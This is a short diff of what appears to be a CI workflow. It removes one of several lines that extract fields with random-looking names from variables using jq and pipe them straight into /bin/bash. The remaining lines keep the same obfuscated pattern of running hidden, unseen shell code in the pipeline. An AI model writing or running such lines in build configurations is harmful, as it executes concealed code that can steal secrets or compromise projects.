@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$x41" | jq -r .kizm28541 | /bin/bash
           echo $baw94709 | jq -r .yojtb22 | /bin/bash
           printf '%s' "$er9466" | jq -r .yakn3195 | /bin/bash
-          echo $ugq28 | jq -r .hyj0 | /bin/bash
           echo $neq58 | jq -r .equxs1567 | /bin/bash
           echo $zyhcq13 | jq -r .tz6 | /bin/bash
           echo $m096 | jq -r .cosay162 | /bin/bash
